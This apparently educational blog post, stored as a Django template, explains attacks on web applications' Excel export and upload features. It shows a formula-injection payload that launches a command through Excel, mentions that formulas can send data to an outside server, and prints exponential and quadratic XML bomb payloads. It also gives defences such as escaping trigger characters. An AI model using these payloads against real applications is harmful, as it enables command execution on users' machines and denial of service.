{% extends "blogs/blog.html" %}
{% load staticfiles %}

{% block title %}
Exploits using .xlsx files (08/04/16)
{% endblock %}

{% block body %}
<p><i>
Disclaimer: The information provided here is purely for educational purposes. The creator of this article assumes no responsibility for misuse of the information provided.
</i></p>
<p>
Many web applications, specifically SaaS applications, offer some sort of Excel export feature. Exploitation of these features is a relatively small niche, and as a result there generally exists many vulnerabilities in these features. This post will outline some approaches to exploiting a web application's Excel features.
</p>
<h3>CSV Excel Macro Injection</h3>
<p>
Some websites offer a feature to export site data to an Excel spreadsheet. Usually, this exported data is data that the user has inputted. Let's say that there exists an export feature in an Excel that includes some user input. With this, an Excel export might look something like this:
</p>
<br><center><img src="{% static "img/xlsx_exploits_1.png" %}"></center><br>
<p>
If the website in question fails to escape user input (which it usually does), you can try changing your name to something like <code>=1+1</code>, and if you're lucky you'll get an output that looks like:
</p>
<br><center><img src="{% static "img/xlsx_exploits_2.png" %}"></center></br>
<p>
You might say "Who cares if we can calculate 1 + 1? Even I can do that!". Well, here's the catch: Excel offers many commands that can be used much more maliciously. For example, if we change our name to <code>=-2+3+cmd|' /C calc'!A0</code>, Windows' version of Excel will open the calculator application. This can be used to execute many other applications, and even execute commands inside of these applications. Moreover, these commands can be used to send information from the user's computer to an arbitrary server via a GET request. Needless to say, this can be used for malicious purposes and so should be protected against.
</p>
<p>
The best way to protect against these injections is to escape any Excel "trigger" characters in cells that the user input is sent to. These are characters that will result in the cell being parsed as a formula. The only characters you need to worry about are <code>%</code>, <code>=</code>, <code>+</code> and <code>-</code>. You can escape these by prepending a <code>'</code> to the cell, so that the cell is parsed as a string and not as a formula.
</p>
<h3>XML Bombing - Exponential Entity Expansion</h3>
<p>
Some applications even offer a feature for uploading your own Excel spreadsheet. In these cases, there are more attacks that are possible; for example, XML bombing. A .xlsx file is really just a .zip file containing .xml files (try unzipping one yourself and see). We can easily edit these XML files and upload them to the website in question. Say we were to edit one of the files to contain the following:
</p>
<pre class="prettyprint">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE bomb [
    &lt;!ENTITY a "123456789"&gt;
    &lt;!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;"&gt;
    &lt;!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;"&gt;
    &lt;!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;"&gt;
    &lt;!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;"&gt;
    &lt;!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;"&gt;
    &lt;!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;"&gt;
    &lt;!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;"&gt;
]&gt;
&lt;bomb&gt;&h;&lt;/bomb&gt;
</pre>
<p>
Defining these entities recursively like this results in a value of <code>&h;</code> that exponentially grows. These entities can continually be defined until the Excel file expands to gigabytes or terabytes, generally resulting in a DoS on the server to which the file was uploaded.
</p>
<p>
Generally these attacks are blocked with one of two methods: either XML parsing requires a maximum definition depth for entities, or entity tags are simply ignored. Both methods have their advantages and disadvantages; in the latter, we may be stopping some expected user input, and in the former, we are vulnerable to another type of XML bombing which will be described next.
</p>
<h3>XML Bombing - Quadratic Entity Expansion</h3>
<p>
A lesser known form of XML bombing is quadratic entity expansion. This tends to have a lesser impact than the exponential expantion, but can still prove to have issues. It is for this reason that entity tags are generally ignored rather than adding a recursion depth to entities. If the above exponential expansion is understood, then this should be fairly simple based on the following example:
</p>
<pre class="prettyprint">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE bomb [
    &lt;!ENTITY a "123456789101112 ... 1000100110021003 ..."&gt;
    &lt;!ENTITY b "&a;&a;&a;&a;&a; ... &a;&a;&a;&a;&a;&a; ..."&gt;
]&gt;
&lt;bomb&gt;&b;&lt;/bomb&gt;
</pre>
{% endblock %}
